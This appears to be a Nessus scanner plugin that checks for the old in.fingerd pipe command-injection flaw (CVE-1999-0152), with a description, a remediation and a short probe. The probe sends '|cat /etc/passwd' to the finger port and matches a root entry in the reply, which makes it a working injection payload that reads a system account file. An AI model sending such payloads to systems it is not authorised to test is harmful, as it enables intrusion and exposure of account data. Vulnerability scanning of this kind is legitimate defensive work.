#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#T

if(description)
{
 script_id(10126);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-1999-0152");
 name["english"] = "in.fingerd pipe";
 
 
 script_name(english:name["english"]);
 desc["english"] = "
It is possible to force the remote finger daemon to execute arbitrary
commands by issuing requests like :

	finger  |command_to_execute@target
	
An attacker may use this bug to gain a shell on this host.
	
Solution : Disable your finger daemon if you do not use it
(comment out the 'finger' line in /etc/inetd.conf and restart the
inetd process) or apply the latest patches from your vendor.

Risk factor : High";

	
 

 script_description(english:desc["english"]);
 
 summary["english"] = "Determines whether in.fingerd is exploitable";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Finger abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/finger", 79);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/finger");
if(!port)port = 79;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = string("|cat /etc/passwd\r\n");
  send(socket:soc, data:d);
  r = recv(socket:soc, length:65535);
  if(egrep(pattern:"root:.*:0:[01]:", string:r))security_hole(port);
  close(soc);
 }
}
